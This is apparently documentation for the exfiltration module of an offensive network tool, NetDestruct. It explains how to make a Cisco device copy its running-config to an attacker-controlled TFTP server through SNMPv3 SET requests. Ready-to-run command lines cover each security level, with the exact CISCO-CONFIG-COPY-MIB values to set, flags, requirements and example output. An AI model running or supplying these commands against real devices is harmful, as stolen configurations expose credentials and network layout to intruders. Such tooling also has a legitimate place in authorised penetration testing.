# Exfiltration

NetDestruct exfiltration modules pull sensitive data onto attacker-controlled infrastructure.

| Module | Section |
|--------|---------|
| SNMPv3 Cisco config → TFTP | [SNMP v3 Cisco Configuration Dump](#snmp-v3-cisco-configuration-dump) |

---

## SNMP v3 Cisco Configuration Dump

Triggers a Cisco device to copy its **running-config** to a TFTP server using SNMPv3 SET requests against `CISCO-CONFIG-COPY-MIB`. Security level is selected from the optional auth/priv flags: `noAuthNoPriv`, `authNoPriv`, or `authPriv`.

Implementation: `libs/exfiltration/snmp/` (SNMPv3 SET helpers in `libs/enumeration/snmp/`)

### Usage

Full `authPriv`:

```bash
./NetDestruct --snmp --config-dump \
  --target 192.168.109.150 \
  --tftp-server 192.168.109.200 \
  --username snmpadmin \
  --auth SHA \
  --auth-pass AuthPass123 \
  --priv AES \
  --priv-pass PrivPass123
```

`authNoPriv` (auth only):

```bash
./NetDestruct --snmp --config-dump \
  --target 192.168.109.150 \
  --tftp-server 192.168.109.200 \
  --username snmpadmin \
  --auth SHA --auth-pass AuthPass123
```

`noAuthNoPriv`:

```bash
./NetDestruct --snmp --config-dump \
  --target 192.168.109.150 \
  --tftp-server 192.168.109.200 \
  --username snmpadmin
```

### Flags

| Flag | Description |
|------|-------------|
| `--snmp` | Enable SNMP mode |
| `--config-dump` | Trigger Cisco running-config copy to TFTP |
| `--target` | Target device IP (or text file / `@file` with multiple IPs) |
| `--tftp-server` | TFTP server IPv4 address (receives the config file) |
| `--username` | SNMPv3 username |
| `--auth` | Optional authentication protocol: `MD5`, `SHA`, `SHA-224`, `SHA-256`, `SHA-384`, `SHA-512` |
| `--auth-pass` | Authentication passphrase (**required if `--auth` is set**) |
| `--priv` | Optional privacy protocol: `DES`, `AES`, `AES-192`, `AES-256` (requires `--auth`) |
| `--priv-pass` | Privacy passphrase (**required if `--priv` is set**) |
| `--port` | SNMP UDP port (optional, default **161**) |

Required: `--target`, `--tftp-server`, `--username`. `--auth`/`--priv` are optional; each requires its matching passphrase when set. `--priv` also requires `--auth`. Cannot be combined with `--walk`, `--enum`, `--brute`, or `--set`.

### Behavior

1. Discovers the SNMPv3 engine ID (RFC 3414)
2. Issues a multi-varbind SET at the selected security level for a random `ccCopyEntry` row:
   - `ccCopyProtocol` = tftp (1)
   - `ccCopySourceFileType` = runningConfig (4)
   - `ccCopyDestFileType` = networkFile (1)
   - `ccCopyServerAddress` = TFTP IPv4
   - `ccCopyFileName` = `<target>-config.txt`
   - `ccCopyEntryRowStatus` = createAndGo (4)
3. On success, the Cisco device initiates a TFTP write to your server

Run a TFTP server on `--tftp-server` (UDP/69) before or while issuing the dump. The config typically lands as `<target-ip>-config.txt` in the TFTP root.

### Example output

```
[SNMP] Mode: config-dump  Version: SNMPv3 authPriv  Port: 161
[SNMP] Auth: SHA  Priv: AES  User: snmpadmin  TFTP: 192.168.109.200
[+] Triggered config copy from 192.168.109.150 → TFTP 192.168.109.200 as 192.168.109.150-config.txt
[SNMP] Ensure a TFTP server is listening on 192.168.109.200:69; file may appear as 192.168.109.150-config.txt
```

### Output color

- `[SNMP]` is **yellow**
- `[+]` success lines are **green**

### Requirements

- SNMPv3 user with write access to `CISCO-CONFIG-COPY-MIB`
- Reachable SNMP UDP port (default 161) on the target
- Reachable TFTP server (UDP/69) from the Cisco device (not necessarily from the attacker host)
- TFTP server address must be **IPv4** (`ccCopyServerAddress`)
- No root required on the attacker host for the SNMP SET itself
